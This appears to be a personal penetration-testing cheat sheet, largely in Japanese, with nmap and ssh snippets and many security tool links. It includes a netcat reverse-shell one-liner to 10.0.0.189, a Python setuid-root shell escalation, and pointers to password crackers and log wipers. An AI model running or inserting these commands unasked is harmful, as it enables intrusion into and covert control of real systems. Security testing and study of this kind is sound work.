# Tools

### nmap

https://nmap.org/

https://orebibou.com/ja/home/201506/20150603_001/

スクリプト：/usr/share/nmap/scripts

```bash
# 頻出ポートの一覧 (上位100)
nmap --top-ports 100 -oG - -v -sSU

# ポートスキャンしない：-Pn
# 名前解決しない：-n
# TCP -sT
# SYN -sS
# UDP -sU

# cheat sheet
curl cheat.sh/nmap
```

### ssh

リモートホストにコピー

```bash
cat file1 | ssh -f user@server 'cd $HOME; cat > file1'
```

踏み台設定

```txt
cat ~/.ssh/config
Host host2
     ProxyCommand ssh host1 nc %h %p
```

### getcap

```bash
getcap -r / 2>/dev/null
```

### password

- 辞書ファイル、パスワードリスト
  - https://download.openwall.net/pub/wordlists/
- password cracker
  - https://www.openwall.com/john/
  - https://github.com/vanhauser-thc/thc-hydra
- password recovery
  - https://en.wikipedia.org/wiki/Cain_and_Abel_(software)

### log wipers

https://packetstormsecurity.com/UNIX/penetration/log-wipers

```bash
# current login users (utmp)
who
w

# login users info (wtmp)
last
ac -p

# last login users (lastlog)
lastlog
```

### netcat

```bash
rm /tmp/pipe; mkfifo /tmp/pipe; cat /tmp/pipe|/bin/sh -i 2>&1|nc 10.0.0.189 1234 > /tmp/pipe
```

### Privilege escalation

```bash
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### POC Tools

https://github.com/mbechler/marshalsec

### Linux

https://access.redhat.com/documentation/ja-jp/red_hat_enterprise_linux/7/html/security_guide/sec-using-aide

### Services & Apps

https://www.crowdstrike.com/

https://chronicle.security/

https://www.fireeye.com/

https://www.darktrace.com/

https://www.blackberry.com/

https://www.menlosecurity.com/

https://www.shodan.io/

https://app.netlas.io  

[Finding Vulnerable Systems Across the Internet with Netlas.io](https://www.hackers-arise.com/post/open-source-intelligence-osint-finding-vulnerable-systems-across-the-internet-with-netlas-io)

https://www.exabeam.com/

https://www.adaptive-shield.com/

https://regexr.com/

https://houdini.secsi.io/

https://github.com/Datadog/stratus-red-team/

https://snyk.io/

https://www.cisa.gov/free-cybersecurity-services-and-tools

https://www.blueteamsacademy.com/top20/

https://www.traceable.ai/

https://www.araalinetworks.com/araali-lens

https://www.gigamon.com/

https://deepfence.io/threatmapper/

### OSS

https://github.com/awslabs/git-secrets

https://github.com/sobolevn/git-secret

https://github.com/optiv/ScareCrow

https://github.com/cytopia/pwncat

https://github.com/Cisco-Talos/clamav

https://github.com/trufflesecurity/truffleHog

https://github.com/tillson/git-hound

https://github.com/decalage2/oletools

https://github.com/decalage2/ViperMonkey

https://github.com/DidierStevens/DidierStevensSuite/blob/master/oledump.py

https://github.com/DidierStevens/DidierStevensSuite/blob/master/zipdump.py

https://github.com/makenowjust-labs/recheck

https://github.com/KathanP19/HowToHunt

https://github.com/bridgecrewio/checkov

https://github.com/Lissy93/personal-security-checklist

https://github.com/decalage2/awesome-security-hardening

https://github.com/curiefense/curiefense

https://github.com/containers/bubblewrap

https://github.com/trufflesecurity/trufflehog

https://github.com/dropbox/zxcvbn

https://github.com/GitGuardian/ggshield

https://github.com/cisagov/cset
